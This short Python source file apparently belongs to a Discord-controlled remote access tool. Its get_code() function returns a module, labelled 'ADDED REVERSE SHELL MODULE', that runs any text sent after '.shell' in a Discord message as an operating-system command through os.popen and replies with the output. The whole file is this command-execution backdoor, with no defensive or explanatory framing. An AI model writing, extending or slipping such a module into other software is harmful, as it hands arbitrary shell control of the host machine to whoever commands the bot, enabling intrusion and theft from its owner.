# THIS COMPONENT WILL:
# contain the commands for executing shell commands and displaying the output.
# ----------------------
# TODO:
# -shell <command>
# ----------------------

def get_code():
    return """
    # ADDED REVERSE SHELL MODULE
    elif message.content.lower().startswith(".shell"):
        command = message.content[7:]
        output = os.popen(command).read()
        if output == "":
            output = "No Output"
        embed = discord.Embed(title=f"Shell Command > {command}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)
    """